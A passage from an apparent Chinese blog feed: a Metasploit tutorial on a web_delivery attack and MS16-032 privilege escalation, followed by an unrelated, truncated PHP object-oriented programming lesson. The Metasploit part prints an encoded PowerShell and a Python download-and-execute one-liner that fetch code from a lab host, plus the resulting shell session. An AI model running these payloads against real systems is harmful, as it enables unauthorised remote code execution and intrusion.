aix/ppc/shell_reverse_tcp                                            manual  No     AIX Command Shell, Reverse TCP Inline</span><br></pre></td></tr></table></figure><h6 id="空指令模块-Nops"><a href="#空指令模块-Nops" class="headerlink" title="空指令模块(Nops)"></a>空指令模块(Nops)</h6><p>不影响程序运行的空指令或无关指令，用于填充。</p><p>使用``show nops`查看。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; show nops</span><br><span class="line"></span><br><span class="line">NOP Generators</span><br><span class="line">==============</span><br><span class="line"></span><br><span class="line">   #  Name             Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----             ---------------  ----    -----  -----------</span><br><span class="line">   <span class="number">0</span>  aarch64/simple                    manual  No     Simple</span><br><span class="line">   <span class="number">1</span>  armle/simple                      manual  No     Simple</span><br><span class="line">   <span class="number">2</span>  mipsbe/better                     manual  No     Better</span><br><span class="line">   <span class="number">3</span>  php/generic                       manual  No     PHP Nop Generator</span><br><span class="line">   <span class="number">4</span>  ppc/simple                        manual  No     Simple</span><br><span class="line">   <span class="number">5</span>  sparc/random                      manual  No     SPARC NOP Generator</span><br><span class="line">   <span class="number">6</span>  tty/generic                       manual  No     TTY Nop Generator</span><br><span class="line">   <span class="number">7</span>  x64/simple                        manual  No     Simple</span><br><span class="line">   <span class="number">8</span>  x86/opty2                         manual  No     Opty2</span><br><span class="line">   <span class="number">9</span>  x86/single_byte                   manual  No     Single Byte</span><br></pre></td></tr></table></figure><h6 id="编码器模块-Encoders"><a href="#编码器模块-Encoders" class="headerlink" title="编码器模块(Encoders)"></a>编码器模块(Encoders)</h6><p>避免”坏字符”的出现，以及免杀处理。</p><p>使用<code>show encoders</code>，查看。</p><h6 id="后渗透攻击模块-posts"><a href="#后渗透攻击模块-posts" class="headerlink" title="后渗透攻击模块(posts)"></a>后渗透攻击模块(posts)</h6><p>使用<code>show post</code>进行查看。</p><p>用以在已经拿到控制权的目标上进行更深层次的渗透。</p><h6 id="辅助模块-Auxiliary"><a href="#辅助模块-Auxiliary" class="headerlink" title="辅助模块(Auxiliary)"></a>辅助模块(Auxiliary)</h6><p>使用<code>show auxiliqry</code>查看。</p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>选择一个指定的模块并使其开始工作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use[Auxiliary&#x2F;Exploit&#x2F;Payload&#x2F;Encoder]</span><br></pre></td></tr></table></figure><p>显示可用的特定功能的模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show [auxiliary&#x2F;exploit&#x2F;payload&#x2F;encoder&#x2F;options]</span><br></pre></td></tr></table></figure><p>给某个特定的对象赋值 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set [options&#x2F;payload]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run   在设定一个辅助模块需要的所有选项之后，启动该模块 </span><br><span class="line">exploit   启动一个渗透攻击模块 </span><br><span class="line">back      取消当前选择的模块并且退回到上一级命令窗口 </span><br><span class="line">info  列出模块的相关信息 </span><br><span class="line">search    搜索符合条件的特定模块</span><br></pre></td></tr></table></figure><h2 id="msf–web-delivery模块攻击实战操作"><a href="#msf–web-delivery模块攻击实战操作" class="headerlink" title="msf–web_delivery模块攻击实战操作"></a>msf–web_delivery模块攻击实战操作</h2><h3 id="模块简介"><a href="#模块简介" class="headerlink" title="模块简介"></a>模块简介</h3><p>在攻击计算机上创建的服务器上托管有效负载。一旦目标机器连接到服务器并且然后执行有效载荷，则运行web传递脚本。</p><h3 id="适用情况"><a href="#适用情况" class="headerlink" title="适用情况"></a>适用情况</h3><p>默写情况下，目标系统没有web环境，我们无法使用webshell获取对方shell，但是我们可以进入对方的系统，或者是对方有命令执行的功能，此时可以使用该模块。常见的是站库分离对数据库服务器的渗透以及网站具有命令执行的功能。</p><h3 id="搜索web-delivery模块"><a href="#搜索web-delivery模块" class="headerlink" title="搜索web_delivery模块"></a>搜索web_delivery模块</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search web_delivery</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                                        Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                                        ---------------  ----       -----  -----------</span><br><span class="line">   <span class="number">0</span>  exploit/multi/postgres/postgres_copy_from_program_cmd_exec  <span class="number">2019</span><span class="number">-03</span><span class="number">-20</span>       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution</span><br><span class="line">   <span class="number">1</span>  exploit/multi/script/web_delivery                           <span class="number">2013</span><span class="number">-07</span><span class="number">-19</span>       manual     No     Script Web Delivery</span><br></pre></td></tr></table></figure><h3 id="利用web-delivery模块"><a href="#利用web-delivery模块" class="headerlink" title="利用web_delivery模块"></a>利用web_delivery模块</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/script/web_delivery) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/script/web_delivery):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SRVHOST  <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>          yes       The local host to listen on. This must be an address on the local machine <span class="keyword">or</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">   SRVPORT  <span class="number">8080</span>             yes       The local port to listen on.</span><br><span class="line">   SSL      false            no        Negotiate SSL <span class="keyword">for</span> incoming connections</span><br><span class="line">   SSLCert                   no        Path to a custom SSL certificate (default <span class="keyword">is</span> randomly generated)</span><br><span class="line">   URIPATH                   no        The URI to use <span class="keyword">for</span> this exploit (default <span class="keyword">is</span> random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (python/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  <span class="number">4444</span>             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   <span class="number">0</span>   Python</span><br></pre></td></tr></table></figure><h3 id="设置参数"><a href="#设置参数" class="headerlink" title="设置参数"></a>设置参数</h3><p>Php</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/script/web_delivery) &gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> target PHP#命令执行的编程语言。</span><br><span class="line">target =&gt; PHP</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; run</span><br></pre></td></tr></table></figure><p>Python</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/script/web_delivery) &gt; set payload python/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; python/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> target Python#命令执行的编程语言。</span><br><span class="line">target =&gt; PHP</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; run</span><br></pre></td></tr></table></figure><p>在windows下可以设置PowerShell脚本。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">先设置监听payload</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> target PSH</span><br><span class="line">target =&gt; PSH</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> LPORT <span class="number">3333</span></span><br><span class="line">LPORT =&gt; <span class="number">3333</span></span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> LHOST <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">LHOST =&gt; <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; run</span><br><span class="line">[*] Exploit running as background job <span class="number">3.</span></span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">172.20</span><span class="number">.10</span><span class="number">.4</span>:<span class="number">3333</span></span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; [*] Using URL: http:<span class="comment">//0.0.0.0:8080/DJbXfk9</span></span><br><span class="line">[*] Local IP: http:<span class="comment">//172.20.10.4:8080/DJbXfk9</span></span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABUAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAFQALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABUAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAyADAALgAxADAALgA0ADoAOAAwADgAMAAvAEQASgBiAFgAZgBrADkALwBRAEIATwBPAGsAQwBqAHYARgBLADYAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMgAwAC4AMQAwAC4ANAA6ADgAMAA4ADAALwBEAEoAYgBYAGYAawA5ACcAKQApADsA</span><br></pre></td></tr></table></figure><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[*] Exploit running as background job <span class="number">0.</span></span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">172.20</span><span class="number">.10</span><span class="number">.4</span>:<span class="number">4444</span></span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; [*] Using URL: http://0.0.0.0:8080/fqPktunoW9r1Hl</span><br><span class="line">[*] Local IP: http:<span class="comment">//172.20.10.4:8080/fqPktunoW9r1Hl</span></span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">python -c <span class="string">&quot;import sys;import ssl;u=__import__(&#x27;urllib&#x27;+&#123;2:&#x27;&#x27;,3:&#x27;.request&#x27;&#125;[sys.version_info[0]],fromlist=(&#x27;urlopen&#x27;,));r=u.urlopen(&#x27;http://172.20.10.4:8080/fqPktunoW9r1Hl&#x27;, context=ssl._create_unverified_context());exec(r.read());&quot;</span></span><br></pre></td></tr></table></figure><p>将payload在目标机器运行。</p><h3 id="进入目标shell"><a href="#进入目标shell" class="headerlink" title="进入目标shell"></a>进入目标shell</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/script/web_delivery) &gt; sessions -l 2</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                      Information      Connection</span><br><span class="line">  --  ----  ----                      -----------      ----------</span><br><span class="line">  <span class="number">2</span>         meterpreter python/linux  steady @ steady  <span class="number">172.20</span><span class="number">.10</span><span class="number">.4</span>:<span class="number">4444</span> -&gt; <span class="number">172.20</span><span class="number">.10</span><span class="number">.10</span>:<span class="number">56678</span> (<span class="number">172.20</span><span class="number">.10</span><span class="number">.10</span>)</span><br><span class="line">  <span class="number">3</span>         meterpreter python/linux  steady @ steady  <span class="number">172.20</span><span class="number">.10</span><span class="number">.4</span>:<span class="number">4444</span> -&gt; <span class="number">172.20</span><span class="number">.10</span><span class="number">.10</span>:<span class="number">56680</span> (<span class="number">172.20</span><span class="number">.10</span><span class="number">.10</span>)</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; sessions -i <span class="number">2</span></span><br><span class="line">[*] Starting interaction with <span class="number">2.</span>..</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process <span class="number">1241</span> created.</span><br><span class="line">Channel <span class="number">1</span> created.</span><br><span class="line">/bin/sh: <span class="number">0</span>: can<span class="number">&#x27;</span>t access tty; job control turned off</span><br><span class="line">$ id</span><br><span class="line">uid=<span class="number">1000</span>(steady) gid=<span class="number">1000</span>(steady) 组=<span class="number">1000</span>(steady),<span class="number">24</span>(cdrom),<span class="number">25</span>(floppy),<span class="number">27</span>(sudo),<span class="number">29</span>(audio),<span class="number">30</span>(dip),<span class="number">44</span>(video),<span class="number">46</span>(plugdev),<span class="number">109</span>(netdev),<span class="number">118</span>(bluetooth),<span class="number">128</span>(lpadmin),<span class="number">133</span>(scanner),<span class="number">1001</span>(wireshark)</span><br></pre></td></tr></table></figure><h2 id="msf-ms016-032的使用"><a href="#msf-ms016-032的使用" class="headerlink" title="msf-ms016-032的使用"></a>msf-ms016-032的使用</h2><h3 id="模块简介-1"><a href="#模块简介-1" class="headerlink" title="模块简介"></a>模块简介</h3><p>该模块利用的是Windows Secondary Logon服务中标准句柄清理功能的缺失。</p><h3 id="适用情况-1"><a href="#适用情况-1" class="headerlink" title="适用情况"></a>适用情况</h3><p>该漏洞会影响Windows7-10，Windows Server2008和2012，32位和64位都会受影响。</p><h3 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h3><p>这个模块只对集成了powershell2.0或更高版本的Windows且具有多个CPU内核的系统有效。</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms16_032_secondary_logon_handle_privesc</span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;渗透测试–Metasploit的使用&quot;&gt;&lt;a href=&quot;#渗透测试–Metasploit的使用&quot; class=&quot;headerlink&quot; title=&quot;渗透测试–Metasploit的使用&quot;&gt;&lt;/a&gt;渗透测试–Metasploit的使用&lt;/h1&gt;&lt;h2 id=&quot;M</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>PHP开发学习--核心编程5</title>
    <link href="http://s1eady.top/2019/12/13/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B5/"/>
    <id>http://s1eady.top/2019/12/13/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B5/</id>
    <published>2019-12-12T23:29:22.000Z</published>
    <updated>2020-11-23T07:48:28.910Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP核心编程5"><a href="#PHP核心编程5" class="headerlink" title="PHP核心编程5"></a>PHP核心编程5</h1><h2 id="静态属性和静态方法"><a href="#静态属性和静态方法" class="headerlink" title="静态属性和静态方法"></a>静态属性和静态方法</h2><p>static关键字修饰的属性，就是静态属性；</p><p>static关键字修饰的方法，就是静态方法；</p><p>静态属性：就是类的属性，与类相关，与对象无关；</p><p>静态方法：就是类的方法，与类相关，与对象无关；</p><p>类的东西(类常量、静态属性、静态方法)，通过”<strong><em>\</em>类名::**</strong>“来调用；</p><p>静态属性或静态方法，在内存中只有一份，被所有对象去共享；</p><p>静态属性或静态方法的好处：就是为了节省内存。例如：创建了100个对象，而静态属性只有一份。</p><p>静态属性和类常量的区别：类常量在一次HTTP请求过程值永远不变；但是静态属性可以改变。</p><p>静态属性和静态方法，都可以加权限控制符，而类常量没有权限。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//私有的保存人数的静态属性：所有对象共享</span></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> $count = <span class="number">60</span>;</span><br><span class="line"><span class="comment">//公共的静态方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$str = <span class="string">&quot;当前文件名：&quot;</span>.<span class="keyword">__FILE__</span>;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;当前函数名：&quot;</span>.<span class="keyword">__FUNCTION__</span>;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;当前方法名：&quot;</span>.<span class="keyword">__METHOD__</span>;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;班级人数：&quot;</span>.Student::$count;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在类外访问公共的静态方法</span></span><br><span class="line"><span class="comment">//访问类的内容(类常量、静态属性、静态方法),不需要创建对象，直接访问</span></span><br><span class="line">Student::showInfo();</span><br></pre></td></tr></table></figure><h2 id="self关键字使用"><a href="#self关键字使用" class="headerlink" title="self关键字使用"></a>self关键字使用</h2><p>$this是指向当前对象的指针，而self是指向当前类的指针；</p><p>$this关键字用来调用对象的属性和方法；</p><p>self用来调用类常量、静态属性、静态方法；</p><p>$this关键字只能在成员方法中使用；</p><p>self关键字可以在成员方法和静态方法中使用；</p><p>提示：对象可以调用：成员属性、成员方法、静态方法</p><p>提示：self可以调用：类常量、静态属性、静态方法、成员方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//定义类常量</span></span><br><span class="line"><span class="keyword">const</span> TITLE = <span class="string">&quot;&lt;h2&gt;第69PHP就业班&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//私有的保存人数的静态属性：所有对象共享</span></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> $count = <span class="number">60</span>;</span><br><span class="line"><span class="comment">//公共的静态方法：在静态方法中$this不存在</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$str = <span class="built_in">self</span>::TITLE;</span><br><span class="line">$str .= <span class="string">&quot;当前文件名：&quot;</span>.<span class="keyword">__FILE__</span>;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;当前函数名：&quot;</span>.<span class="keyword">__FUNCTION__</span>;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;当前方法名：&quot;</span>.<span class="keyword">__METHOD__</span>;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;班级人数：&quot;</span>.<span class="built_in">self</span>::$count;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"><span class="comment">//var_dump($this); $this不能存在于静态方法</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在类外访问公共的静态方法</span></span><br><span class="line"><span class="comment">//访问类的内容(类常量、静态属性、静态方法),不需要创建对象，直接访问</span></span><br><span class="line"><span class="comment">//对象可以调用：成员属性、成员方法、静态方法</span></span><br><span class="line">$obj = <span class="keyword">new</span> Student();</span><br><span class="line">$obj-&gt;showInfo();</span><br></pre></td></tr></table></figure><h2 id="类的封装性"><a href="#类的封装性" class="headerlink" title="类的封装性"></a>类的封装性</h2><h3 id="什么是类的封装性"><a href="#什么是类的封装性" class="headerlink" title="什么是类的封装性"></a>什么是类的封装性</h3><p>类的三大特性：封装性、继承性、多态性；</p><p>封装性：将敏感的数据保护起来，不被外界访问；还可以理解为，将一个功能的方方面面，封装成一个整体，即类；</p><p>类的封装性，是通过访问权限修饰符来实现的；</p><p>提示：在项目中，属性基本都是私有的。通过公有的方法，对私有的属性进行赋值和取值。</p><h3 id="访问权限修饰符介绍"><a href="#访问权限修饰符介绍" class="headerlink" title="访问权限修饰符介绍"></a>访问权限修饰符介绍</h3><p>public(公共的权限)：在任何地方都可以被访问，主要是类内、类外、子类中都可以被访问。</p><p>private(私有的权限)：只能在本类中被访问，类外和子类中无权访问。</p><p>protected(受保护的权限)：只能在本类中和子类中被访问，在类外不能访问。</p><h3 id="实例：数据库的封装类"><a href="#实例：数据库的封装类" class="headerlink" title="实例：数据库的封装类"></a>实例：数据库的封装类</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义最终的单例的数据库工具类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//私有的静态的保存对象的属性</span></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> $obj = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的数据库配置信息</span></span><br><span class="line"><span class="keyword">private</span> $db_host; <span class="comment">//主机名</span></span><br><span class="line"><span class="keyword">private</span> $db_user; <span class="comment">//用户名</span></span><br><span class="line"><span class="keyword">private</span> $db_pass; <span class="comment">//密码</span></span><br><span class="line"><span class="keyword">private</span> $db_name; <span class="comment">//数据库名</span></span><br><span class="line"><span class="keyword">private</span> $charset; <span class="comment">//字符集</span></span><br><span class="line"><span class="keyword">private</span> $link;   <span class="comment">//连接对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的构造方法：阻止类外new对象</span></span><br><span 